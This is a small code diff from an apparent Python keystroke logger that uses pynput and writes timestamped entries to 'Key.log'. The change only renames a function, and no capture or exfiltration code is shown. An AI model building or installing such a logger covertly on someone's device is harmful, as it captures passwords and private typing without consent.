@@ -3,7 +3,7 @@ import logging
 from pynput import keyboard
 
 
-def logger():
+def loggerOS():
     logging.basicConfig( filename=("Key.log"), filemode="w", format='%(asctime)s:%(message)s',
                          level=logging.DEBUG )
 
